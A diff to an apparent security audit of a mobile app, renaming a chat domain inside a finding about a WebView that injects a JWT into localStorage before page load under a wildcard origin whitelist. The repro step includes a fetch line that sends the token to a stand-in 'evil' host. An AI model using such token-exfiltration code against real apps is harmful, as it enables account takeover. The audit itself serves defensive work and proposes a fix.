@@ -20,7 +20,7 @@
    each one.** `src/app/(tabs)/chat.tsx:193` sets
    `originWhitelist={['https://*', 'http://*']}` and
    `injectedJavaScriptBeforeContentLoaded` writes `windy_auth_token` into
-   `localStorage` before the page loads. If `chat.windyword.ai` ever 301s
+   `localStorage` before the page loads. If `chat.windychat.ai` ever 301s
    to a third-party domain (CDN misconfig, subdomain takeover, auth
    federation, ad tracker), the redirect target reads the JWT.
    **P0-1** below.
@@ -72,16 +72,16 @@
   `originWhitelist={['https://*', 'http://*']}`. `buildInjectedJS()` at
   line 30 writes the account-server JWT (`windy_auth_token`) into the
   page's `localStorage` **before** first content load. Any redirect chain
-  landing on a non-`chat.windyword.ai` page — Cloudflare challenge, a 301
+  landing on a non-`chat.windychat.ai` page — Cloudflare challenge, a 301
   to an auth federation provider, a subdomain takeover, a compromised
   third-party SDK served from the chat domain — will leak the token to
   the redirect target.
-- **Repro.** Point a local DNS override for `chat.windyword.ai` at an
+- **Repro.** Point a local DNS override for `chat.windychat.ai` at an
   attacker-controlled host serving a page that runs
   `fetch('https://evil/collect?t=' + localStorage.getItem('windy_auth_token'))`.
   Launch the app → Chat tab. The attacker receives the JWT.
 - **Fix.** Tighten `originWhitelist` to a single-host list
-  (`['https://chat.windyword.ai']` in prod, plus `'http://localhost:3000'`
+  (`['https://chat.windychat.ai']` in prod, plus `'http://localhost:3000'`
   in `__DEV__`). Optional hardening: inject the token in
   `onNavigationStateChange` only after confirming the final navigated URL
   matches the expected host, rather than pre-load.
@@ -474,7 +474,7 @@ Full list in `docs/audit/coverage-gaps.md`. Headlines:
   credential resolution, bundler) is inference from `eas.json` + past
   builds.
 - **No live probes to `windyword.ai`, `api.eternitas.ai`, `mail.windymail.ai`,
-  `chat.windyword.ai`.** Every "expected response shape" claim in
+  `chat.windychat.ai`.** Every "expected response shape" claim in
   `endpoint-inventory.txt` is derived from grep against the mobile code's
   `.json()` consumers and from server code on this machine — not from a
   round-trip call.
